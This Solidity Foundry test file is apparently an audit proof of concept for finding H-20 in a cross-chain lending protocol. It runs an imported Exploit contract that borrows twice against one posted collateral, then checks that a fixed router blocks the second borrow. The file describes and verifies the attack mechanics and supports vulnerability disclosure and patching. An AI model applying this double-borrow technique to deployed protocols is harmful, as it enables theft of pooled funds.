// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import {
    Exploit,
    Token,
    LendStorage,
    DestMarket,
    CrossChainRouter,
    CrossChainRouterFixed
} from "./58389-h-20-multiple-cross-chain-borrows-using-same-collateral-sh.sol";

// LEND H-20: borrowCrossChain ships the borrower's collateral to the destination
// without locking it on the source chain, so concurrent requests to different
// destinations each borrow the full collateral value → N× overborrow.
contract PoC_58389_LendSharedCollateral is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant COLLATERAL = 1_000e18;

    function test_attacker_doubleBorrowsSameCollateral() public {
        Exploit exp = new Exploit();
        exp.run();

        Token token = exp.token();
        uint256 borrowed = token.balanceOf(address(exp)) + token.balanceOf(SINK);
        uint256 unbacked = token.balanceOf(SINK);

        emit log_named_uint("collateral posted      ", COLLATERAL);
        emit log_named_uint("total borrowed         ", borrowed);
        emit log_named_uint("unbacked (over collat) ", unbacked);

        // Two borrows of the full collateral value cleared against one collateral.
        assertEq(borrowed, 2 * COLLATERAL, "expected 2x borrow against 1x collateral");
        // Exactly one collateral's worth is unbacked debt (protocol loss).
        assertEq(unbacked, COLLATERAL, "unbacked amount mismatch");
    }

    // Control: locking the collateral before dispatch blocks the second borrow.
    function test_control_fixedLocksCollateral() public {
        Token token = new Token();
        LendStorage store = new LendStorage();
        DestMarket destB = new DestMarket(token);
        DestMarket destC = new DestMarket(token);
        CrossChainRouterFixed router = new CrossChainRouterFixed(store);

        store.setCollateral(address(this), COLLATERAL);
        token.mint(address(destB), COLLATERAL);
        token.mint(address(destC), COLLATERAL);

        router.borrowCrossChain(COLLATERAL, destB); // first borrow: locks the collateral

        // Second borrow must revert — no free collateral left.
        vm.expectRevert(bytes("insufficient collateral"));
        router.borrowCrossChain(COLLATERAL, destC);

        emit log_named_uint("fixed total borrowed", token.balanceOf(address(this)));
        assertEq(token.balanceOf(address(this)), COLLATERAL, "fixed must cap borrow at collateral");
    }
}
